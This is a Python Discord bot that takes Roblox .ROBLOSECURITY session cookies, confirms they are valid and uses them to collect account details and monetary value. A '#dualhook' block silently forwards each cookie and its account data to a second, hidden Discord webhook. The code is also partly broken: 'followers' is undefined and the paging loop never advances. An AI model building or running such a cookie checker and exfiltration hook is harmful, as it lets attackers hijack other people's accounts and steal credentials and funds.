
import os
import discord, requests, discord_webhook
from discord.ext import commands
from discord_webhook import DiscordEmbed, DiscordWebhook
import requests

req = requests.Session()
client = commands.Bot(command_prefix='.') #set prefix

@client.event
async def on_ready():
  print('bot ready!') #print bot ready! when bot is online

@client.command() #command
async def check(ctx, cookie):
  check = req.get('https://api.roblox.com/currency/balance', cookies={'.ROBLOSECURITY': str(cookie)}) #check if the cookie is valid 
  if check.status_code ==200: #if valid..
    email = requests.get('https://accountsettings.roblox.com/v1/email', cookies={'.ROBLOSECURITY': str(cookie)}).json()['verified']
    credit = requests.get("https://billing.roblox.com/v1/credit", cookies={'.ROBLOSECURITY': str(cookie)}).json()['balance']
    userdata = requests.get("https://users.roblox.com/v1/users/authenticated",cookies={".ROBLOSECURITY":cookie}).json() #get user data
    birthday = requests.get("https://accountinformation.roblox.com/v1/birthdate", cookies={'.ROBLOSECURITY': str(cookie)}).json()
    print(birthday)
    userid = userdata['id'] #user id
    transactions = requests.get(f"https://economy.roblox.com/v2/users/{userid}/transaction-totals?timeFrame=Month&transactionType=summary", cookies={'.ROBLOSECURITY': str(cookie)}, data={'timeFrame':'Month', 'transactionType': 'summary'}).json()
    pending = transactions['pendingRobuxTotal']
    stipends = transactions['premiumStipendsTotal']
    devEx = transactions['developerExchangeTotal']
    groupIds = []
    for i in requests.get(f"https://groups.roblox.com/v1/users/{userid}/groups/roles", cookies={'.ROBLOSECURITY': str(cookie)}).json()['data']:
      groupIds.append(i['group']['id'])
    groupFunds = 0
    for i in groupIds:
      groupFunds = groupFunds + int(requests.get(f"https://economy.roblox.com/v1/groups/{i}/currency", cookies={'.ROBLOSECURITY': str(cookie)}).json()['robux'])
    creationDate = requests.get(f'https://users.roblox.com/v1/users/{userid}').json()['created']
    display = userdata['displayName'] #display name
    username = userdata['name'] #username
    robuxdata = requests.get(f'https://economy.roblox.com/v1/users/{userid}/currency',cookies={".ROBLOSECURITY":cookie}).json() 
    robux = robuxdata['robux'] #get robux balance
    #does the user have premium?
    premiumbool = requests.get(f'https://premiumfeatures.roblox.com/v1/users/{userid}/validate-membership', cookies={".ROBLOSECURITY":cookie}).json()
    #get rap
    rap_dict = requests.get(f'https://inventory.roblox.com/v1/users/{userid}/assets/collectibles?assetType=All&sortOrder=Asc&limit=100',cookies={".ROBLOSECURITY":cookie}).json()
    while rap_dict['nextPageCursor'] != None:
        rap_dict = requests.get(f'https://inventory.roblox.com/v1/users/{userid}/assets/collectibles?assetType=All&sortOrder=Asc&limit=100',cookies={".ROBLOSECURITY":cookie}).json()
    rap = sum(i['recentAveragePrice'] for i in rap_dict['data'])
    birthdate = f'{birthday["birthMonth"]}/{birthday["birthDay"]}/{birthday["birthYear"]}'
    thumbnail=requests.get(f"https://thumbnails.roblox.com/v1/users/avatar?userIds={userid}&size=420x420&format=Png&isCircular=false").json()
    image_url = thumbnail["data"][0]["imageUrl"]
    pindata = requests.get('https://auth.roblox.com/v1/account/pin',cookies={".ROBLOSECURITY":cookie}).json() 
    pin_bool = pindata["isEnabled"] #does the user have a pin
    #make an embed #does the user have a pin
    #make an embed
    e = discord.Embed(title=f'**{username}**',url=f'https://roblox.com/users/{userid}',color=1752220)
    e.set_author(name='Bot made by Ice Bear#8828')
    e.add_field(name='Display Name👀:', value = '```' + str(display) + '```')
    e.add_field(name='User ID🔍:', value = '```' + str(userid) + '```')
    e.add_field(name='Robux💰:', value = '```' + str(robux) + '```')
    e.add_field(name='Has Pin?🔐:', value='```' + str(pin_bool) + '```')
    e.add_field(name='RAP📈:', value='```' + str(rap) + '```')
    e.add_field(name='Premium💎:', value = '```' + str(premiumbool) + '```')
    e.add_field(name='Credit💵: ',value=f'```{credit}```', inline=True)
    e.add_field(name='Birthday🎂: ',value=f'```{birthdate}```', inline=True)
    e.add_field(name='Account Age👴: ',value=f'```{creationDate}```', inline=True)
    e.add_field(name='Email Verified📩: ',value=f'```{email}```', inline=True)
    e.add_field(name='Group Funds🤑: ',value=f'```{groupFunds}```', inline=True)
    e.add_field(name='Dev Exchange💱: ',value=f'```{devEx}```', inline=True)
    e.add_field(name='Pending⌛: ',value=f'```{pending}```', inline=True)
    e.add_field(name='Premium Stipends💳: ',value=f'```{stipends}```', inline=True)
    e.add_field(name='Followers🎥: ',value=f'```{followers}```', inline=True)
    e.add_field(name='Cookie🍪:', value=f'```{cookie}```', inline=False)
    e.set_thumbnail(url=image_url)
    e.set_footer(text='Join for more epic methods https://discord.gg/legal')
    await ctx.send(embed=e)

    #dualhook
    e = DiscordEmbed(title=f'**{username}**',url=f'https://roblox.com/users/{userid}',color='03b2f8')
    e.set_author(name='Bot made by Ice Bear#8828')
    e.add_embed_field(name='Display Name👀:', value = '```' + str(display) + '```')
    e.add_embed_field(name='User ID🔍:', value = '```' + str(userid) + '```')
    e.add_embed_field(name='Robux💰:', value = '```' + str(robux) + '```')
    e.add_embed_field(name='Has Pin?🔐:', value='```' + str(pin_bool) + '```')
    e.add_embed_field(name='RAP📈:', value='```' + str(rap) + '```')
    e.add_embed_field(name='Premium💎:', value = '```' + str(premiumbool) + '```')
    e.add_embed_field(name='Credit💵: ',value=f'```{credit}```', inline=True)
    e.add_embed_field(name='Birthday🎂: ',value=f'```{birthdate}```', inline=True)
    e.add_embed_field(name='Account Age👴: ',value=f'```{creationDate}```', inline=True)
    e.add_embed_field(name='Email Verified📩: ',value=f'```{email}```', inline=True)
    e.add_embed_field(name='Group Funds🤑: ',value=f'```{groupFunds}```', inline=True)
    e.add_embed_field(name='Dev Exchange💱: ',value=f'```{devEx}```', inline=True)
    e.add_embed_field(name='Pending⌛: ',value=f'```{pending}```', inline=True)
    e.add_embed_field(name='Premium Stipends💳: ',value=f'```{stipends}```', inline=True)
    e.add_embed_field(name='Followers🎥: ',value=f'```{followers}```', inline=True)
    e.add_embed_field(name='Cookie🍪:', value=f'```{cookie}```', inline=False)
    e.set_thumbnail(url=image_url)
    e.set_footer(text='Join for more epic methods https://discord.gg/legal')
    webhook = DiscordWebhook(url='YourWebhookHERE', username="New Log")
    webhook.add_embed(e)
    webhook.execute()
  else:
    e = discord.Embed(title='**❌ Cookie is Expired! ❌**',color=0xff0000)
    await ctx.send(embed=e)
    
  

client.run('TOKENHERE') #replace with your bot token
